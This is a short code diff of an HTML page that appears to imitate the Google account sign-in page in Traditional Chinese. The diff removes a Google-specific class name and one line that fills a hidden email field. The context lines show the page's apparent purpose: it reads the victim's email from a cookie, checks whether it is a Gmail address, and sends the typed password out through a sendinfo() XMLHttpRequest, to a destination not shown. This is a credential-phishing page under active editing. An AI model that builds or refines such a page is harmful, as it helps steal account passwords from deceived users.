@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-TW" dir="ltr" class="CMgTXc gr__accounts_google_com">
+<html lang="zh-TW" dir="ltr" class="CMgTXc">
 <head>
 <script src="https://cdn.jsdelivr.net/npm/js-cookie@2.2.0/src/js.cookie.min.js"></script>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -144,7 +144,6 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 			}
 	});
 	document.getElementById("pIdr").innerHTML = Cookies.get('email');
-	document.getElementById("uremail").value = Cookies.get('email');
 	function sendinfo() {
 		if(document.getElementById("pw").value!="") {
 		var xhttp = new XMLHttpRequest();
